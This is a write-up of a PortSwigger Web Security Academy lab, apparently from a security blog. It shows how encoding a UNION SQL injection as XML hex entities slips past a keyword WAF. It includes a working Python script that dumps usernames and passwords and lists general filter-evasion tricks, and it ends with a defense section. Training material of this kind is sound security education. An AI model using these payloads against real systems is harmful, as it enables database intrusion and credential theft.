---
title: "SQL injection with filter bypass via XML encoding"
date: 2026-06-11 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, union, waf-bypass, xml]
description: "A PortSwigger Web Security Academy lab where a WAF blocks the obvious UNION attack — until you hide the payload from it by encoding the whole injection as XML character entities."
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) lab hides a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) in a stock-check feature that talks to the server in **XML**. A Web Application Firewall blocks the normal UNION attack, so the real lesson is a classic WAF bypass: encode the payload at a layer the firewall can't read but the backend will decode.

## The technique

Clicking "Check stock" doesn't send a normal form — it posts an XML document to `POST /product/stock`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The server drops `storeId` straight into a SQL query. You can tell it's being *evaluated* because sending `1+1` returns the stock for store 2 — the value is computed, not just matched. That's an injection point.

The obvious next move is a UNION attack:

```
1 UNION SELECT NULL
```

But the app answers `"Attack detected"`. A WAF in front of the database rejects any request whose bytes contain scary keywords like `UNION SELECT`, so the payload never reaches SQL.

The bypass exploits the fact that **two readers** inspect the request in order. XML lets any character be written as a numeric character reference — `U` can be `&#x55;` (hex). When the XML parser reads the document it decodes those references back into letters **before** the application sees them. So:

1. **The WAF** sees raw bytes `&#x55;&#x4e;&#x49;&#x4f;&#x4e;…` — meaningless entities, no `UNION` keyword, request allowed.
2. **The XML parser** then decodes them into `UNION SELECT …` and the database runs it.

Encode the *entire* injection as hex entities. Burp's Hackvertor extension does this with its `hex_entities` button; the manual equivalent is a one-line generator: `''.join('&#x%x;' % ord(c) for c in payload)`.

One more constraint: returning two columns makes the app show `0 units` (an error), so the query exposes a **single** column. Glue the username and password together with the SQL concatenation operator `||` and a `~` separator so both fit in one column:

```sql
1 UNION SELECT username || '~' || password FROM users
```

## Solution

Encode that payload as XML hex entities, send it in `storeId`, and read the response. One self-contained script:

```python
import urllib.request as u

rhost = "https://<lab-id>.web-security-academy.net"
s = chr(39)  # single quote, kept out of the source to dodge shell quoting
payload = "1 UNION SELECT username || " + s + "~" + s + " || password FROM users"
entities = "".join("&#x%x;" % ord(c) for c in payload)
body = "<stockCheck><productId>1</productId><storeId>" + entities + "</storeId></stockCheck>"

req = u.Request(rhost + "/product/stock", data=body.encode(),
                headers={"Content-Type": "application/xml"})
print(u.urlopen(req).read().decode())
```

The response lists every user as `username~password`:

```
carlos~<redacted>
728 units
administrator~<redacted>
wiener~<redacted>
```

Take the `administrator` row, log in at `/login`, and the lab shows **Solved**.

## Why it worked

The WAF made its decision on the **raw text** of the request, but that text is **transformed** (XML-decoded) before it reaches the database. Whenever a filter inspects one representation of input and a later stage decodes it into a different one, the filter can be slipped. XML entities, URL and double-URL encoding, Unicode escapes, mixed case (`uniOn`), and inline comments (`UN/**/ION`) are all the same idea — encode where the WAF can't see through, and the backend reassembles your SQL.

## Fix / defense

- **Use parameterized queries / prepared statements.** The injection only works because `storeId` is concatenated into the SQL string. With bound parameters the value is never parsed as SQL no matter what it decodes to — this kills the bug outright.
- **Don't treat a keyword WAF as the real defense.** Signature blocking is a speed bump that encoding bypasses; keep it only as defense-in-depth on top of safe queries, never instead of them.
- **Validate the decoded input** and run the database account at least privilege, so even a successful injection can't reach other tables.
